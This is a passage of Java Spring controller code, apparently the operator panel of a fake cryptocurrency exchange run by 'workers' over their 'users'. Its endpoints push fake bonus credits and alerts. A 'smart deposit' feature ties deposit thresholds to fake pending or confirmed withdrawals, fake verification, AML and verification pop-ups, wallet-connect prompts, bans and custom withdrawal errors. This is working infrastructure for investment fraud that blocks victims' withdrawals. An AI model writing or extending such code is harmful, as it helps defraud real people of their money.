            userErrorMessageRepository.save(userErrorMessage);
        }

        return ResponseEntity.ok("success");
    }

    //todo: кулдауны
    @PostMapping(value = "/user-edit/alert")
    public ResponseEntity<String> userEditAlertController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String type = (String) data.get("type");
        Worker worker = workerService.getWorker(authentication);
        String cooldownKey = worker.getId() + "-" + type;
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (StringUtils.isBlank(type)) {
            return ResponseEntity.badRequest().body("type_error");
        }

        String message = (String) data.get("message");

        message = XSSUtils.sanitize(message);

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        if (message.length() > 1000) {
            return ResponseEntity.badRequest().body("message_is_too_large");
        }

        UserAlert.Type alertType = UserAlert.Type.ALERT;
        Coin coin = null;
        double amount = 0;
        List<User> users;
        if (type.equals("CURRENT")) {
            users = Collections.singletonList(user);
        } else if (type.equals("ALL")) {
            users = worker.getUsers();
        } else if (type.equals("BONUS_CURRENT") || type.equals("BONUS_ALL")) {
            alertType = UserAlert.Type.BONUS;
            long coinId = Long.parseLong(String.valueOf(data.get("coin")));
            coin = coinRepository.findById(coinId).orElse(null);
            if (coin == null) {
                return ResponseEntity.badRequest().body("coin_not_found");
            }

            amount = getDoubleValue(data, "amount");
            if (amount <= 0) {
                return ResponseEntity.badRequest().body("amount_error");
            }

            if (type.equals("BONUS_CURRENT")) {
                users = Collections.singletonList(user);
            } else {
                users = worker.getUsers();
            }
        } else {
            return ResponseEntity.badRequest().body("error");
        }

        //todo: придумать че то с этим
        for (User alertUser : users) {
            UserAlert alert = new UserAlert();
            alert.setUser(alertUser);
            alert.setType(alertType);
            alert.setMessage(message);
            alert.setCoin(coin);
            alert.setAmount(amount);

            userAlertRepository.save(alert);
        }

        if (type.contains("_ALL")) {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(60));
        } else {
            cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(5));
        }

        return ResponseEntity.ok("success");
    }
    //end user-edit

    //start utility
    @PostMapping(value = "/utility")
    public ResponseEntity<String> utilityController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_FEATURE" -> {
                return editFeature(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    //todo: оптимизировать
    private ResponseEntity<String> editFeature(Authentication authentication, Map<String, Object> data) {
        User user = userService.getUser(authentication);
        String cooldownKey = user.getId() + "-edit-feature";
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        String featureType = (String) data.get("feature");
        UserFeature.Type type = UserFeature.Type.valueOf(featureType);
        boolean enabled = (boolean) data.get("enabled");

        Worker worker = workerService.getWorker(authentication);

        List<User> users = worker.getUsers();
        List<UserFeature> existingFeatures = userFeatureRepository.findAllByUserWorkerIdAndType(worker.getId(), type);

        List<UserFeature> featuresToSave = new ArrayList<>();

        for (User workerUser : users) {
            UserFeature userFeature = existingFeatures.stream().filter(feature -> feature.getUser().getId() == workerUser.getId())
                    .findFirst()
                    .orElseGet(() -> {
                        UserFeature newUserFeature = new UserFeature();
                        newUserFeature.setType(type);
                        newUserFeature.setUser(workerUser);

                        return newUserFeature;
                    });

            userFeature.setEnabled(enabled);

            featuresToSave.add(userFeature);
        }

        userFeatureRepository.saveAll(featuresToSave);

        cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(30));

        return ResponseEntity.ok("success");
    }
    //end utility

    //start deposits
    @PostMapping(value = "/deposits")
    public ResponseEntity<String> depositsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "PAID_OUT" -> {
                return depositPaidOut(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> depositPaidOut(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        UserDeposit userDeposit = userDepositRepository.findByIdAndWorkerId(id, worker.getId()).orElse(null);
        if (userDeposit == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        UserTransaction userTransaction = userDeposit.getTransaction();
        if (userTransaction.getStatus() == UserTransaction.Status.COMPLETED) {
            return ResponseEntity.ok("success");
        }

        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransactionRepository.save(userTransaction);

        userService.addBalance(userDeposit.getUser(), userTransaction.getCoinSymbol(), userDeposit.getAmount());

        return ResponseEntity.ok("success");
    }
    //end deposits

    //start support preset settings
    @PostMapping(value = "/settings/presets")
    public ResponseEntity<String> settingsPresetsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SUPPORT_PRESET_SETTINGS" -> {
                return editSupportPresetSettings(authentication, data);
            }
            case "ADD_SUPPORT_PRESET" -> {
                return addSupportPreset(authentication, data);
            }
            case "DELETE_SUPPORT_PRESET" -> {
                return deleteSupportPreset(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSupportPresetSettings(Authentication authentication, Map<String, Object> data) {
        Worker worker = workerService.getWorker(authentication);
        String cooldownKey = worker.getId() + "-presets_edit";
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        boolean enabled = (boolean) data.get("enabled");

        List<Map<String, Object>> presets = (List<Map<String, Object>>) data.get("presets");
        Map<Long, Map<String, Object>> presetsMap = new HashMap<>();
        for (Map<String, Object> preset : presets) {
            long id = Long.parseLong(String.valueOf(preset.get("id")));
            presetsMap.put(id, preset);
        }
        List<WorkerSupportPreset> workerSupportPresets = workerSupportPresetsRepository.findAllByWorkerId(worker.getId());
        for (WorkerSupportPreset workerSupportPreset : workerSupportPresets) {
            Map<String, Object> preset = presetsMap.get(workerSupportPreset.getId());
            if (preset == null) {
                continue;
            }

            String title = String.valueOf(preset.get("title"));
            title = XSSUtils.stripXSS(title);
            if (StringUtils.isBlank(title)) {
                return ResponseEntity.badRequest().body("invalid_title");
            }

            String message = String.valueOf(preset.get("message"));
            message = XSSUtils.stripXSS(message);
            if (StringUtils.isBlank(message) || message.length() > 2000) {
                return ResponseEntity.badRequest().body("invalid_message");
            }

            workerSupportPreset.setTitle(title);
            workerSupportPreset.setMessage(message);
        }

        workerSupportPresetsRepository.saveAllByWorkerId(workerSupportPresets, worker.getId());

        WorkerSettings workerSettings = worker.getSettings();
        workerSettings.setSupportPresetsEnabled(enabled);

        workerSettingsRepository.save(workerSettings);

        cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(15));

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addSupportPreset(Authentication authentication, Map<String, Object> data) {
        String title = (String) data.get("title");
        title = XSSUtils.stripXSS(title);
        if (StringUtils.isBlank(title)) {
            return ResponseEntity.badRequest().body("invalid_title");
        }

        String message = (String) data.get("message");
        message = XSSUtils.stripXSS(message);
        if (StringUtils.isBlank(message) || message.length() > 2000) {
            return ResponseEntity.badRequest().body("invalid_message");
        }

        Worker worker = workerService.getWorker(authentication);

        if (workerSupportPresetsRepository.countByWorkerId(worker.getId()) >= 40) {
            return ResponseEntity.badRequest().body("limit");
        }

        WorkerSupportPreset workerSupportPreset = new WorkerSupportPreset();
        workerSupportPreset.setTitle(title);
        workerSupportPreset.setMessage(message);
        workerSupportPreset.setWorker(worker);

        workerSupportPresetsRepository.save(workerSupportPreset);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportPreset(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        if (!workerSupportPresetsRepository.existsByIdAndWorkerId(id, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        workerSupportPresetsRepository.deleteById(id, worker.getId());

        return ResponseEntity.ok("success");
    }
    //end support preset settings

    //start smart-deposit
    @PostMapping(value = "/settings/smart-deposit")
    public ResponseEntity<String> smartDepositController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_SETTINGS" -> {
                return editSmartDepositSettings(authentication, data);
            }
            case "ADD_STEP" -> {
                return addStep(authentication, data);
            }
            case "DELETE_STEP" -> {
                return deleteStep(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editSmartDepositSettings(Authentication authentication, Map<String, Object> data) {
        Worker worker = workerService.getWorker(authentication);

        boolean enabled = (boolean) data.get("enabled");

        worker.setSmartDepositEnabled(enabled);

        workerRepository.save(worker);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addStep(Authentication authentication, Map<String, Object> data) {
        Worker worker = workerService.getWorker(authentication);
        if (workerSmartDepositStepsRepository.countByWorkerId(worker.getId()) >= 10) {
            return ResponseEntity.badRequest().body("limit");
        }

        double amount = getDoubleValue(data, "amount");
        if (amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        String coinSymbol = String.valueOf(data.get("coin"));
        String finalCoinSymbol = coinSymbol;
        CoinType coinType = Arrays.stream(CoinType.values()).filter(type -> type.name().equalsIgnoreCase(finalCoinSymbol)).findFirst().orElse(null);
        if (coinType == null) {
            coinSymbol = "USD";
        }

        String type = String.valueOf(data.get("type"));
        SmartDepositStep.SmartDepositStepType smartDepositStepType = type.equals("total_deposits_sum") ? SmartDepositStep.SmartDepositStepType.TOTAL_DEPOSITS_SUM : SmartDepositStep.SmartDepositStepType.MIN_DEPOSIT;

        boolean fakeWithdrawPending = (boolean) data.get("fake_withdraw_pending");
        boolean fakeWithdrawConfirmed = (boolean) data.get("fake_withdraw_confirmed");
        boolean premium = (boolean) data.get("premium");
        boolean walletConnect = (boolean) data.get("wallet_connect");
        boolean verifModal = (boolean) data.get("verif_modal");
        boolean amlModal = (boolean) data.get("aml_modal");
        boolean fakeVerified = (boolean) data.get("fake_verified");
        boolean globalBan = (boolean) data.get("global_ban");

        boolean changeWithdrawError = (boolean) data.get("change_withdraw_error");

        WorkerSmartDepositStep step = new WorkerSmartDepositStep();
        step.setAmount(amount);

        step.setCoinSymbol(coinSymbol);
        step.setType(smartDepositStepType);

        step.setFakeWithdrawPending(fakeWithdrawPending);
        step.setFakeWithdrawConfirmed(fakeWithdrawConfirmed);
        step.setPremium(premium);
        step.setWalletConnect(walletConnect);
        step.setVerifModal(verifModal);
        step.setAmlModal(amlModal);
        step.setFakeVerified(fakeVerified);
        step.setGlobalBan(globalBan);

        step.setChangeWithdrawError(changeWithdrawError);

        if (changeWithdrawError) {
            String withdrawError = XSSUtils.sanitize(String.valueOf(data.get("withdraw_error")));
            step.setWithdrawError(withdrawError);
        }

        step.setWorker(worker);

        workerSmartDepositStepsRepository.save(step);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteStep(Authentication authentication, Map<String, Object> data) {
        Worker worker = workerService.getWorker(authentication);

        long id = Long.parseLong(String.valueOf(data.get("id")));

        if (!workerSmartDepositStepsRepository.existsByIdAndWorkerId(id, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        workerSmartDepositStepsRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end smart-deposit

    private double getDoubleValue(Map<String, Object> data, String key) {
        return data.get(key) == null ? -1D : Double.parseDouble(String.valueOf(data.get(key)));
    }
}
